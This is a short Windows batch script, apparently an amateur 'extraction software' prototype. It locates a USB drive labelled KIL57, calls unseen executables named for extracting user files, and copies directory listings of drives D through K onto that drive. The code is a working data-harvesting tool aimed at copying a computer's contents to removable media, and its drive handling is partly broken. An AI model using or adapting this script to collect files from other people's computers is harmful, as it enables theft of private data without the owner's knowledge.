cls
@echo off
title EXTRACTOR_prototype_01
color f0
echo 				EXTRACTION SOFTWARE
echo.
echo             					 by ars57
echo.
echo.
echo to copy all documents from the computer to the pen drive 
echo select YES when a pop-up comes
echo.
echo.
echo.
echo.
echo.
echo.
color 0a
@echo on
start copying.bat
call make_directory.exe
call extract_user_files.exe
:: property of akhil_raj_s
title get all derectories
@ECHO OFF
FOR %%a in ( d e f g h i j k l m n o p q r s t u v w x y z) do vol %%a: 2>nul |find "KIL57" >nul && set drv=%%a:
echo. %drv%
F:
dir /s/p > F_system.txt
xcopy "F:\F_system.txt" "%drv%\extractor\user_data\user\dirs"
D:
dir /s/p > D_system.txt
xcopy "D:\D_system.txt" "%drv%\extractor\user_data\user\dirs"
E:
dir /s/p > E_system.txt
xcopy "E:\E_system.txt" "%drv%\extractor\user_data\user\dirs"
G:
dir /s/p > G_system.txt
xcopy "G:\G_system.txt" "%drv%\extractor\user_data\user\dirs"
H:
dir /s/p > H_system.txt
xcopy "H:\H_system.txt" "%drv%\extractor\user_data\user\dirs"
I:
dir /s/p > I_system.txt
xcopy "I:\I_system.txt" "%drv%\extractor\user_data\user\dirs"
j:
dir /s/p > j_system.txt
xcopy "j:\j_system.txt" "%drv%\extractor\user_data\user\dirs"
K:
dir /s/p > K_system.txt
xcopy "K:\K_system.txt" "%drv%\extractor\user_data\user\dirs"
call finished_dirs.exe
@ECHO OFF
FOR %%a in ( d e f g h i j k l m n o p q r s t u v w x y z) do vol %%a: 2>nul |find "KIL57" >nul && set drv=%%a:
echo. %drv%
del %drv%\extractor\*.txt